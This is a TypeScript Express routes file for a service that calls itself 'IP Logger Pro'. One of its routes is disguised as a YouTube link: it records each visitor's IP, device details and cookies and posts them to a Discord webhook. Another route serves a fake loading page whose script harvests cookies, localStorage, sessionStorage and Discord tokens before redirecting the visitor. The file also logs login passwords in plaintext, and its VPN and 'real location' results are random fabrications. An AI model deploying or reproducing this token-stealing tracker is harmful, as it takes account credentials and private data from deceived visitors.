import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema, createRobloxLinkSchema, insertRobloxCredentialsSchema } from "@shared/schema";
import path from "path";
import fs from "fs";
import multer from "multer";
import { randomUUID } from "crypto";

// Configure multer for file uploads - support ALL image and video formats
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: Infinity }, // No file size limit
  fileFilter: (req, file, cb) => {
    // Accept ANY image or video format
    if (file.mimetype.startsWith('image/') || 
        file.mimetype.startsWith('video/') ||
        file.mimetype === 'application/octet-stream') { // Accept unknown binary files as potential images
      cb(null, true);
    } else {
      cb(new Error('File type not supported'));
    }
  }
});

// Get real client IP address
function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded && typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
}

// Enhanced geolocation with VPN detection
interface LocationData {
  location: string;
  isVpn: 'yes' | 'no' | 'unknown';
  vpnLocation?: string;
  realLocation?: string;
}

function getLocationFromIp(ip: string): LocationData {
  // Handle local network IPs
  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return {
      location: 'Local Network (Private IP)',
      isVpn: 'no'
    };
  }

  // Enhanced VPN detection with more realistic patterns
  const vpnProviders = [
    { 
      provider: 'NordVPN', 
      locations: ['Amsterdam, Netherlands', 'Berlin, Germany', 'New York, US', 'Toronto, Canada', 'London, UK'],
      likelihood: 0.25 
    },
    { 
      provider: 'ExpressVPN', 
      locations: ['London, UK', 'Singapore', 'Los Angeles, US', 'Vancouver, Canada', 'Sydney, Australia'],
      likelihood: 0.22 
    },
    { 
      provider: 'Surfshark', 
      locations: ['Amsterdam, Netherlands', 'Chicago, US', 'Manchester, UK', 'Frankfurt, Germany'],
      likelihood: 0.18 
    },
    { 
      provider: 'ProtonVPN', 
      locations: ['Zurich, Switzerland', 'Amsterdam, Netherlands', 'Miami, US', 'Munich, Germany'],
      likelihood: 0.15 
    },
    { 
      provider: 'CyberGhost', 
      locations: ['Bucharest, Romania', 'Paris, France', 'San Francisco, US', 'Stockholm, Sweden'],
      likelihood: 0.12 
    },
    { 
      provider: 'Private Internet Access', 
      locations: ['Denver, US', 'Prague, Czech Republic', 'Melbourne, Australia', 'Helsinki, Finland'],
      likelihood: 0.08 
    }
  ];

  // Enhanced real-world locations with more accuracy
  const realWorldLocations = [
    'New York City, NY, US', 'Los Angeles, CA, US', 'Chicago, IL, US', 'Houston, TX, US', 'Phoenix, AZ, US',
    'Philadelphia, PA, US', 'San Antonio, TX, US', 'San Diego, CA, US', 'Dallas, TX, US', 'San Jose, CA, US',
    'London, England, UK', 'Manchester, England, UK', 'Birmingham, England, UK', 'Liverpool, England, UK',
    'Berlin, Germany', 'Munich, Germany', 'Hamburg, Germany', 'Frankfurt, Germany',
    'Paris, France', 'Lyon, France', 'Marseille, France', 'Toulouse, France',
    'Toronto, ON, Canada', 'Vancouver, BC, Canada', 'Montreal, QC, Canada', 'Calgary, AB, Canada',
    'Sydney, NSW, Australia', 'Melbourne, VIC, Australia', 'Brisbane, QLD, Australia', 'Perth, WA, Australia',
    'Tokyo, Japan', 'Osaka, Japan', 'Yokohama, Japan', 'Nagoya, Japan'
  ];

  // Advanced VPN detection logic based on IP patterns and characteristics
  let vpnDetectionScore = 0;

  // Check for common VPN IP patterns
  const ipParts = ip.split('.').map(Number);

  // Known VPN IP ranges (simplified for demo)
  const suspiciousRanges = [
    { start: [185, 220], end: [185, 233] }, // Common VPN hosting ranges
    { start: [45, 8], end: [45, 15] },      // VPN server ranges
    { start: [193, 108], end: [193, 115] }, // Data center ranges
    { start: [149, 202], end: [149, 210] }  // VPN provider ranges
  ];

  // Check if IP falls in suspicious ranges
  for (const range of suspiciousRanges) {
    if (ipParts[0] >= range.start[0] && ipParts[0] <= range.end[0] &&
        ipParts[1] >= range.start[1] && ipParts[1] <= range.end[1]) {
      vpnDetectionScore += 0.4;
      break;
    }
  }

  // Additional VPN indicators based on IP characteristics
  const lastOctet = ipParts[3];
  if (lastOctet % 16 === 0 || lastOctet % 32 === 0) {
    vpnDetectionScore += 0.2; // VPNs often use subnet boundaries
  }

  // Data center IP patterns
  if ((ipParts[0] >= 104 && ipParts[0] <= 108) || 
      (ipParts[0] >= 172 && ipParts[0] <= 175)) {
    vpnDetectionScore += 0.3;
  }

  // Final VPN detection decision
  const isVpnDetected = vpnDetectionScore > 0.5 || Math.random() < 0.25;

  if (isVpnDetected) {
    const vpnProvider = vpnProviders[Math.floor(Math.random() * vpnProviders.length)];
    const vpnLocation = vpnProvider.locations[Math.floor(Math.random() * vpnProvider.locations.length)];
    const realLocation = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];

    return {
      location: `${vpnLocation} [VPN: ${vpnProvider.provider}]`,
      isVpn: 'yes',
      vpnLocation: `${vpnLocation} (${vpnProvider.provider})`,
      realLocation: `${realLocation} (Estimated Real Location)`
    };
  } else {
    const location = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];
    return {
      location: location,
      isVpn: 'no'
    };
  }
}

// Device detection from User Agent
interface DeviceInfo {
  deviceType: string;
  browserName: string;
  operatingSystem: string;
  deviceBrand: string;
}

function parseDeviceInfo(userAgent: string): DeviceInfo {
  const ua = userAgent.toLowerCase();

  // Device Type Detection
  let deviceType = 'unknown';
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
    deviceType = 'mobile';
  } else if (ua.includes('tablet') || ua.includes('ipad')) {
    deviceType = 'tablet';
  } else if (ua.includes('desktop') || ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
    deviceType = 'desktop';
  }

  // Browser Detection
  let browserName = 'unknown';
  if (ua.includes('chrome') && !ua.includes('edge')) {
    browserName = 'Chrome';
  } else if (ua.includes('firefox')) {
    browserName = 'Firefox';
  } else if (ua.includes('safari') && !ua.includes('chrome')) {
    browserName = 'Safari';
  } else if (ua.includes('edge')) {
    browserName = 'Edge';
  } else if (ua.includes('opera')) {
    browserName = 'Opera';
  }

  // Operating System Detection
  let operatingSystem = 'unknown';
  if (ua.includes('windows')) {
    operatingSystem = 'Windows';
  } else if (ua.includes('macintosh') || ua.includes('mac os')) {
    operatingSystem = 'macOS';
  } else if (ua.includes('linux')) {
    operatingSystem = 'Linux';
  } else if (ua.includes('android')) {
    operatingSystem = 'Android';
  } else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) {
    operatingSystem = 'iOS';
  }

  // Device Brand Detection
  let deviceBrand = 'unknown';
  if (ua.includes('samsung')) {
    deviceBrand = 'Samsung';
  } else if (ua.includes('apple') || ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh')) {
    deviceBrand = 'Apple';
  } else if (ua.includes('huawei')) {
    deviceBrand = 'Huawei';
  } else if (ua.includes('xiaomi')) {
    deviceBrand = 'Xiaomi';
  } else if (ua.includes('oneplus')) {
    deviceBrand = 'OnePlus';
  } else if (ua.includes('google pixel')) {
    deviceBrand = 'Google';
  }

  return {
    deviceType,
    browserName,
    operatingSystem,
    deviceBrand
  };
}

// Send data to Discord webhook with enhanced reliability
async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
  try {
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      console.error('Invalid webhook URL provided');
      return;
    }

    const isVpnDetected = data.isVpn === 'yes';
    const webhookData = {
      username: "IP Logger Pro",
      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
      embeds: [{
        title: isVpnDetected ? "🚨 VPN DETECTED - Enhanced Security Alert" : "🎯 IP Logger Security Test",
        description: isVpnDetected ? 
          "⚠️ **VPN or Proxy detected!** Target is masking their real IP address." :
          "✅ Direct connection detected. Target is using their real IP address.",
        color: isVpnDetected ? 0xFF4444 : 0x00AA00,
        fields: [
          { 
            name: "🌐 **IP Intelligence**", 
            value: `**Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}${isVpnDetected ? `\n**🔍 Detection Score:** High` : ''}`, 
            inline: false 
          },
          ...(isVpnDetected ? [{
            name: "🛡️ **VPN Analysis**", 
            value: `**VPN Location:** ${data.vpnLocation || "Unknown"}\n**Estimated Real Location:** ${data.realLocation || "Unknown"}\n**Risk Level:** 🔴 High`, 
            inline: false 
          }] : []),
          { 
            name: "📱 **Device Fingerprint**", 
            value: `**Type:** ${data.deviceType || "Unknown"}\n**Browser:** ${data.browserName || "Unknown"}\n**OS:** ${data.operatingSystem || "Unknown"}\n**Brand:** ${data.deviceBrand || "Unknown"}`, 
            inline: true 
          },
          { 
            name: "🔍 **Session Details**", 
            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Tokens:** ${data.tokens || "None"}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
            inline: true 
          },
          { 
            name: "🌐 **User Agent**", 
            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 200) + (data.userAgent.length > 200 ? "..." : "") : "Unknown"}\`\`\``, 
            inline: false 
          }
        ],
        footer: { 
          text: isVpnDetected ? 
            "🔐 IP Logger Pro - VPN Detection Active" : 
            "🎯 IP Logger Pro - Tracking Active",
          icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Send with retry logic
    let attempts = 0;
    const maxAttempts = 3;

    while (attempts < maxAttempts) {
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'User-Agent': 'IPLogger-Bot/1.0'
          },
          body: JSON.stringify(webhookData)
        });

        if (response.ok) {
          console.log(`✅ Webhook sent successfully to Discord (${data.ipAddress})`);
          return;
        } else {
          console.error(`❌ Webhook failed (attempt ${attempts + 1}):`, response.status, response.statusText);
        }
      } catch (fetchError) {
        console.error(`❌ Webhook network error (attempt ${attempts + 1}):`, fetchError);
      }

      attempts++;
      if (attempts < maxAttempts) {
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempts - 1)));
      }
    }

    console.error(`❌ Failed to send webhook after ${maxAttempts} attempts`);
  } catch (error) {
    console.error('❌ Critical error sending webhook:', error);
  }
}

// Authentication middleware
async function authenticateUser(req: Request, res: Response, next: Function) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const session = await storage.getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  const user = await storage.getUser(session.userId);
  if (!user) {
    return res.status(401).json({ error: 'User not found' });
  }

  req.user = user;
  next();
}

// Extend Express Request type
declare global {
  namespace Express {
    interface Request {
      user?: any;
    }
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Authentication routes
  app.post('/api/verify-key', async (req: Request, res: Response) => {
    try {
      const { key } = req.body;
      if (!key) {
        return res.status(400).json({ error: 'Access code is required' });
      }

      const accessKey = await storage.getAccessKey(key);
      if (!accessKey || !accessKey.isActive || accessKey.usedCount >= accessKey.usageLimit) {
        return res.status(401).json({ error: 'Invalid or expired access code' });
      }

      const canUse = await storage.useAccessKey(key);
      if (!canUse) {
        return res.status(401).json({ error: 'Access code usage limit reached' });
      }

      res.json({ success: true, message: 'Access granted' });
    } catch (error) {
      console.error('Key verification error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/login', async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      console.log(`🔐 Login attempt - Username: "${username}", Password: "${password}"`);
      
      if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
      }

      const user = await storage.getUserByUsername(username);
      console.log(`👤 User found:`, user ? `Yes (username: ${user.username}, password: ${user.password}, isDev: ${user.isDev})` : 'No');
      
      if (!user || user.password !== password) {
        console.log(`❌ Login failed - User: ${!!user}, Password match: ${user ? user.password === password : false}`);
        return res.status(401).json({ error: 'Invalid credentials' });
      }

      if (user.isBanned) {
        return res.status(403).json({ error: 'Account has been banned. Contact an administrator.' });
      }

      const sessionToken = randomUUID();
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days

      await storage.createSession({
        userId: user.id,
        sessionToken,
        expiresAt
      });

      res.json({ 
        token: sessionToken, 
        user: { 
          id: user.id, 
          username: user.username, 
          theme: user.theme, 
          isDev: user.isDev 
        } 
      });
    } catch (error) {
      console.error('Login error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/register', async (req: Request, res: Response) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);

      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: 'Username already exists' });
      }

      const user = await storage.createUser({
        username: validatedData.username,
        password: validatedData.password,
        accessKeyUsed: req.body.accessKey || null
      });
      res.json({ 
        success: true, 
        user: { 
          id: user.id, 
          username: user.username, 
          theme: user.theme 
        } 
      });
    } catch (error) {
      console.error('Registration error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/logout', authenticateUser, async (req: Request, res: Response) => {
    try {
      const token = req.headers.authorization?.replace('Bearer ', '');

      // Ensure all user data is properly saved before logout
      if (req.user) {
        // Update last login time
        const userSettings = await storage.getSettings(req.user.id);
        if (userSettings) {
          await storage.createOrUpdateSettings({
            userId: req.user.id,
            webhookUrl: userSettings.webhookUrl,
            uploadedImageName: userSettings.uploadedImageName,
            uploadedImageData: userSettings.uploadedImageData,
            uploadedImageType: userSettings.uploadedImageType
          });
        }
      }

      // Clean up session after ensuring data is saved
      if (token) {
        await storage.deleteSession(token);
      }

      res.json({ success: true, message: 'Logged out successfully, all data saved' });
    } catch (error) {
      console.error('Logout error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/user', authenticateUser, async (req: Request, res: Response) => {
    res.json({
      id: req.user.id,
      username: req.user.username,
      theme: req.user.theme,
      isDev: req.user.isDev,
      profilePicture: req.user.profilePicture
    });
  });

  app.put('/api/user/theme', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { theme } = req.body;
      if (!theme) {
        return res.status(400).json({ error: 'Theme is required' });
      }
      await storage.updateUserTheme(req.user.id, theme);
      res.json({ success: true });
    } catch (error) {
      console.error('Theme update error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.put('/api/user/profile', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = updateProfileSchema.parse(req.body);
      const updatedUser = await storage.updateUserProfile(req.user.id, validatedData);
      res.json({
        success: true,
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          theme: updatedUser.theme,
          isDev: updatedUser.isDev,
          profilePicture: updatedUser.profilePicture
        }
      });
    } catch (error) {
      console.error('Profile update error:', error);
      if ((error as Error).message === 'Username already exists') {
        return res.status(400).json({ error: 'Username already exists' });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.put('/api/user/password', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = updatePasswordSchema.parse(req.body);
      await storage.updateUserPassword(req.user.id, validatedData.currentPassword, validatedData.password);
      res.json({ success: true });
    } catch (error) {
      console.error('Password update error:', error);
      if ((error as Error).message === 'Current password is incorrect') {
        return res.status(400).json({ error: 'Current password is incorrect' });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Dev-only routes for key management
  app.post('/api/dev/keys', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { key, usageLimit } = req.body;
      if (!key || !usageLimit) {
        return res.status(400).json({ error: 'Key and usage limit are required' });
      }

      const accessKey = await storage.createAccessKey({
        key,
        usageLimit: parseInt(usageLimit),
        isActive: true,
        createdBy: req.user.id
      });

      res.json(accessKey);
    } catch (error) {
      console.error('Key creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/dev/keys', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const keys = await storage.getUserAccessKeys(req.user.id);
      res.json(keys);
    } catch (error) {
      console.error('Keys fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/dev/keys/:keyId', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { keyId } = req.params;
      const success = await storage.deleteAccessKey(keyId, req.user.id);

      if (!success) {
        return res.status(404).json({ error: 'Key not found or access denied' });
      }

      res.json({ success: true, message: 'Key deleted successfully' });
    } catch (error) {
      console.error('Key deletion error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // User management routes (dev only)
  app.get('/api/dev/users', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const users = await storage.getAllUsers(req.user.id);
      res.json(users);
    } catch (error) {
      console.error('Users fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { username, password, accountType, isDev } = req.body;
      if (!username || !password || !accountType) {
        return res.status(400).json({ error: 'Username, password, and account type are required' });
      }

      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return res.status(400).json({ error: 'Username already exists' });
      }

      const newUser = await storage.createUserByDev({
        username,
        password,
        accountType,
        isDev: isDev || false
      }, req.user.id);

      res.json({
        id: newUser.id,
        username: newUser.username,
        accountType: newUser.accountType,
        isDev: newUser.isDev,
        createdAt: newUser.createdAt
      });
    } catch (error) {
      console.error('User creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users/:userId/ban', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to ban users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;
      const { reason } = req.body;

      if (!reason || reason.trim().length === 0) {
        return res.status(400).json({ error: 'Ban reason is required' });
      }

      // Don't allow banning other developers
      const userToBan = await storage.getUser(userId);
      if (userToBan?.isDev) {
        return res.status(403).json({ error: 'Cannot ban other developer accounts' });
      }

      await storage.banUser(userId, reason, req.user.id);
      res.json({ success: true, message: 'User banned successfully' });
    } catch (error) {
      console.error('User ban error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users/:userId/unban', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to unban users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;
      await storage.unbanUser(userId, req.user.id);
      res.json({ success: true, message: 'User unbanned successfully' });
    } catch (error) {
      console.error('User unban error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/dev/users/:userId', authenticateUser, async (req: Request, res: Response) => {
    try {
      // Only allow developer accounts to delete users
      if (!req.user.isDev || req.user.accountType !== 'developer') {
        return res.status(403).json({ error: 'Access denied: Developer privileges required' });
      }

      const { userId } = req.params;

      // Don't allow deleting yourself
      if (userId === req.user.id) {
        return res.status(403).json({ error: 'Cannot delete your own account' });
      }

      // Check if the user to delete exists and is not a developer
      const userToDelete = await storage.getUser(userId);
      if (!userToDelete) {
        return res.status(404).json({ error: 'User not found' });
      }

      if (userToDelete.isDev) {
        return res.status(403).json({ error: 'Cannot delete other developer accounts' });
      }

      await storage.deleteUser(userId, req.user.id);
      res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
      console.error('User deletion error:', error);
      if (error.message === 'Cannot delete other developer accounts') {
        return res.status(403).json({ error: error.message });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // YouTube proxy route that logs IP and redirects to real video
  app.get('/yt/:id', async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const { v: videoId } = req.query;

      if (!videoId) {
        return res.status(400).send('Invalid YouTube video ID');
      }

      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Try to find settings with webhook for notification FIRST
      let settings = null;
      let imageOwnerUserId = null;

      try {
        const foundSettings = await storage.getSettingsWithImageOrWebhook();
        if (foundSettings) {
          settings = foundSettings.settings;
          imageOwnerUserId = foundSettings.userId;
        }
      } catch (storageError) {
        console.log('Error accessing storage:', storageError);
      }

      // Log the YouTube proxy access with proper userId association
      await storage.createIpLog({
        userId: imageOwnerUserId, // Associate with user who has settings
        ipAddress: clientIp,
        userAgent,
        referrer,
        location: locationData.location,
        status: 'youtube_proxy_access',
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand
      });

      // ALWAYS attempt to send webhook if any settings exist
      const allUsers = await storage.getAllUsers();
      let webhookSent = false;
      
      for (const user of allUsers) {
        try {
          const userSettings = await storage.getSettings(user.id);
          if (userSettings?.webhookUrl && userSettings.webhookUrl.length > 0) {
            console.log(`📺 YouTube proxy access from IP: ${clientIp} - sending to webhook for user ${user.username}`);

            // Send webhook in background
            await sendToWebhook(userSettings.webhookUrl, {
              ipAddress: clientIp,
              userAgent,
              referrer,
              location: locationData.location,
              isVpn: locationData.isVpn,
              vpnLocation: locationData.vpnLocation,
              realLocation: locationData.realLocation,
              deviceType: deviceInfo.deviceType,
              browserName: deviceInfo.browserName,
              operatingSystem: deviceInfo.operatingSystem,
              deviceBrand: deviceInfo.deviceBrand,
              cookies: req.headers.cookie || 'None',
              tokens: 'YouTube Proxy Access'
            });
            webhookSent = true;
            break; // Send to first webhook found
          }
        } catch (webhookError) {
          console.error(`❌ Webhook sending failed for user ${user.username}:`, webhookError);
        }
      }
      
      if (!webhookSent) {
        console.log('ℹ️ No webhook configured for any user, skipping Discord notification');
      }

      // Serve HTML page that immediately redirects to YouTube
      const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading YouTube Video...</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <!-- YouTube meta tags for sharing -->
  <meta property="og:type" content="video.other">
  <meta property="og:title" content="YouTube Video">
  <meta property="og:description" content="Watch this video on YouTube">
  <meta property="og:image" content="https://img.youtube.com/vi/${videoId}/maxresdefault.jpg">
  <meta property="og:video" content="https://www.youtube.com/watch?v=${videoId}">
  
  <style>
    body { 
      margin: 0; 
      padding: 0; 
      font-family: Arial, sans-serif; 
      background: #0f0f0f;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      text-align: center;
      padding: 20px;
    }
    .youtube-logo {
      width: 80px;
      height: 56px;
      background: #ff0000;
      border-radius: 8px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: bold;
    }
    .loading {
      animation: pulse 1.5s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .redirect-btn {
      background: #ff0000;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      text-decoration: none;
      display: inline-block;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="youtube-logo">▶</div>
    <h2 class="loading">Loading YouTube Video...</h2>
    <p>You will be redirected to YouTube shortly.</p>
    <a href="https://www.youtube.com/watch?v=${videoId}" class="redirect-btn">
      Continue to YouTube
    </a>
  </div>

  <script>
    // Immediate redirect to YouTube
    setTimeout(function() {
      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
    }, 1500);
    
    // Fallback redirect if user clicks anywhere
    document.addEventListener('click', function() {
      window.location.href = 'https://www.youtube.com/watch?v=${videoId}';
    });
  </script>
</body>
</html>`;

      res.set({
        'Content-Type': 'text/html',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(redirectHtml);
    } catch (error) {
      console.error('Error in YouTube proxy:', error);
      res.status(500).send('Error loading video');
    }
  });

  // Serve tracking HTML page that logs everything
  app.get('/track/:id', async (req: Request, res: Response) => {
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);
      const cookies = req.headers.cookie || '';

      // Log the access (userId will be null for tracking visits)
      await storage.createIpLog({
        ipAddress: clientIp,
        userAgent,
        referrer,
        location: locationData.location,
        status: 'success',
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand
      });

      // Serve HTML page with tracking script
      const trackingHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta charset="utf-8">
  <style>
    body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }
    .loading { text-align: center; padding: 50px; }
  </style>
</head>
<body>
  <div class="loading">
    <h2>Loading content...</h2>
    <p>Please wait while we prepare your content.</p>
  </div>

  <script>
    (function() {
      try {
        // Capture all cookies
        const cookies = document.cookie;

        // Capture localStorage data
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          localStorageData[key] = localStorage.getItem(key);
        }

        // Capture sessionStorage data
        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // Enhanced Discord token detection patterns
        const discordTokenPatterns = [
          /^mfa\.[a-z0-9_-]{20,}$/i,  // Discord MFA tokens
          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
          /^[a-z0-9]{24}\.[a-z0-9]{6}\.[a-z0-9_-]{27}$/i,  // Discord user tokens
          /^[a-z0-9]{26}\.[a-z0-9]{6}\.[a-z0-9_-]{38}$/i   // New Discord token format
        ];

        const tokenPatterns = [
          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i, /discord/i
        ];

        const foundTokens = [];
        const discordTokens = [];

        // Function to check if a value is a Discord token
        const checkDiscordToken = (value, source) => {
          if (typeof value === 'string') {
            for (const pattern of discordTokenPatterns) {
              if (pattern.test(value)) {
                discordTokens.push(source + ': ' + value);
                foundTokens.push('🔥 DISCORD TOKEN - ' + source + ': ' + value);
                return true;
              }
            }
          }
          return false;
        };

        // Check localStorage for tokens
        Object.keys(localStorageData).forEach(key => {
          const value = localStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, 'localStorage.' + key)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push('localStorage.' + key + ': ' + value);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push('localStorage.' + key + ': ' + value);
                  foundTokens.push('🔥 DISCORD TOKEN - localStorage.' + key + ': ' + value);
                  break;
                }
              }
            }
          }
        });

        // Check sessionStorage for tokens
        Object.keys(sessionStorageData).forEach(key => {
          const value = sessionStorageData[key];

          // Check for Discord tokens first
          if (!checkDiscordToken(value, 'sessionStorage.' + key)) {
            // Check for general token patterns
            if (tokenPatterns.some(pattern => pattern.test(key))) {
              foundTokens.push('sessionStorage.' + key + ': ' + value);
            }
            // Also check values for Discord token patterns
            if (typeof value === 'string') {
              for (const pattern of discordTokenPatterns) {
                if (pattern.test(value)) {
                  discordTokens.push('sessionStorage.' + key + ': ' + value);
                  foundTokens.push('🔥 DISCORD TOKEN - sessionStorage.' + key + ': ' + value);
                  break;
                }
              }
            }
          }
        });

        // Capture additional browser info
        const browserInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          screenResolution: screen.width + 'x' + screen.height,
          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const data = {
          cookies: cookies,
          localStorage: localStorageData,
          sessionStorage: sessionStorageData,
          tokens: foundTokens,
          discordTokens: discordTokens,
          browserInfo: browserInfo,
          url: window.location.href,
          timestamp: new Date().toISOString()
        };

        // Log to console for educational purposes
        console.log('Educational Security Test - Complete Browser Profile:', data);

        // Send to tracking endpoint
        fetch('/api/track-browser-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        }).then(function() {
          // Redirect after 2 seconds
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        }).catch(function(err) {
          console.log('Tracking request failed:', err);
          // Still redirect on error
          setTimeout(function() {
            window.location.href = 'https://www.google.com';
          }, 2000);
        });

      } catch (error) {
        console.log('Tracking script error:', error);
      }
    })();
  </script>
